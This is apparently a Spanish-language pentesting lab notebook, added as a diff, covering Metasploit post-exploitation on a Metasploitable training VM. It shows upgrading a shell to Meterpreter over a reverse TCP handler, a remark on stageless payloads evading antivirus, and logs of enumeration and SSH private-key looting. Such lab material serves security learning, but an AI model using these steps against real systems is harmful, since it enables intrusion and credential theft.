@@ -1,0 +1,80 @@
+Una vez tenemos ya creada la session, podemos dejarla en background con el comando CTRL + Z . Para retomar esa session usamos el comando: sessions -i + numero de session. 
+Una vez volvemos a abrir la session, usaremos el comando : uname -a Para poder saber que tipo de maquina es la que estoy trabajando. i686 significa que es un entorno de 64 bits ejecutandose en una maquina fisica cuya arquitectura es de 32 bits. Esto es muy importante porque a la hora de elegir el payload que iremos utilizar, debemos ajustarlo a la arquitectura de nuestro objetivo. Ahora buscaremos un metodo de post explotacion. 
+Usaremos el search para buscar shell_to_meterpreter. Este metodo de post nos requiere tener una session abierta, por eso el sentido de dejarla en background a la sesion que ya teniamos abierta. Debemos pasarle, con el comando set, el localhost y el numero de sesion que tenemos en background. Una vez configurado eso usamos este exploit y ya tendremos acceso. Nos aparecerá una consola meterpreter que para ver que podemos usar con el comando help .
+
+Si queremos descargarnos algun archivo de la maquina de Metasploitable a nuestra maquina solo debemos usar el comando download + nombre del archivo
+
+msf6 post(multi/manage/shell_to_meterpreter) > exploit
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.0.2.10:4433 
+[*] Sending stage (1017704 bytes) to 10.0.2.11
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > [*] Meterpreter session 2 opened (10.0.2.10:4433 -> 10.0.2.11:51923) at 2023-12-18 05:34:51 -0500
+
+[*] Stopping exploit/multi/handler
+
+En algunas ocasiones podremos utilizar payloads que son stager y payloads que son stager less. La diferencia entre ambos es que un stager lo que hace es enviar una serie de instrucciones para que se conecte a nuestro handler. Y es el handler que enviará le codigo malicioso del exploit.
+En cambio un stageless no tiene handler y manda directamente el codigo malicioso. 
+Esto sirve porque  a veces uno puede funcionar mejor que otro, por ejemplo contra antivirus. 
+La diferencia entre uno y el otro es que esta separado por / el stager y por _ el stageless. 
+
+Una vez estamos con la consola de meterpreter abierta podemos usar run y 2 veces tabulador y nos mostrará todos los modulos compatibles para poder realizar la post explotacion en esta maquina. 
+Por ejemplo usaremos un modulo que nos dice las protecciones que tenemos en la maquina. 
+meterpreter > run post/linux/gather/enum_protections 
+
+[*] Running module against 10.0.2.11 [metasploitable]
+[*] Info:
+[*]     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) || | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
+[*]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+[*] Finding system protections...
+[+] ASLR is enabled
+[-] Failed to open file: /proc/sys/kernel/exec-shield: core_channel_open: Operation failed: 1
+[-] Failed to open file: /proc/sys/kernel/yama/ptrace_scope: core_channel_open: Operation failed: 1
+[*] Finding installed applications...
+[+] ufw found: /usr/sbin/ufw
+[+] iptables found: /sbin/iptables
+[+] logrotate found: /usr/sbin/logrotate
+[+] tcpdump found: /usr/sbin/tcpdump
+[+] aa-status found: /usr/sbin/aa-status
+[*] System protections saved to notes.
+
+
+Otro modulo para enumerar el sistema:
+meterpreter > run post/linux/gather/enum_system 
+
+[+] Info:
+[+]     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) || | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
+[+]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+[+]     Module running as "root" user
+[*] Linux version stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_121588.txt
+[*] User accounts stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_807782.txt
+[*] Installed Packages stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_153845.txt
+[*] Running Services stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_201479.txt
+[*] Cron jobs stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_919004.txt
+[*] Disk info stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_578930.txt
+[*] Logfiles stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_077330.txt
+[*] Setuid/setgid files stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_622070.txt
+[*] CPU Vulnerabilities stored in /root/.msf4/loot/20231218082314_default_10.0.2.11_linux.enum.syste_555243.txt
+
+
+Otro ejemplo para recabar información de credenciales del puerto SSH:
+meterpreter > run post/multi/gather/ssh_creds 
+
+[*] Finding .ssh directories
+[*] Looting 3 .ssh directories
+[*] Looting /home/msfadmin/.ssh directory
+[+] Downloaded /home/msfadmin/.ssh/known_hosts -> /root/.msf4/loot/20231218083646_default_10.0.2.11_ssh.known_hosts_242153.txt
+[+] Downloaded /home/msfadmin/.ssh/authorized_keys -> /root/.msf4/loot/20231218083648_default_10.0.2.11_ssh.authorized_k_255704.txt
+[+] Downloaded /home/msfadmin/.ssh/id_rsa -> /root/.msf4/loot/20231218083649_default_10.0.2.11_ssh.id_rsa_056734.txt
+[+] Downloaded /home/msfadmin/.ssh/id_rsa.pub -> /root/.msf4/loot/20231218083650_default_10.0.2.11_ssh.id_rsa.pub_919270.txt
+[*] Looting /home/user/.ssh directory
+[+] Downloaded /home/user/.ssh/id_dsa.pub -> /root/.msf4/loot/20231218083651_default_10.0.2.11_ssh.id_dsa.pub_166964.txt
+[+] Downloaded /home/user/.ssh/id_dsa -> /root/.msf4/loot/20231218083653_default_10.0.2.11_ssh.id_dsa_426248.txt
+[*] Looting /root/.ssh directory
+[+] Downloaded /root/.ssh/known_hosts -> /root/.msf4/loot/20231218083655_default_10.0.2.11_ssh.known_hosts_313904.txt
+[+] Downloaded /root/.ssh/authorized_keys -> /root/.msf4/loot/20231218083656_default_10.0.2.11_ssh.authorized_k_284807.txt
+
+
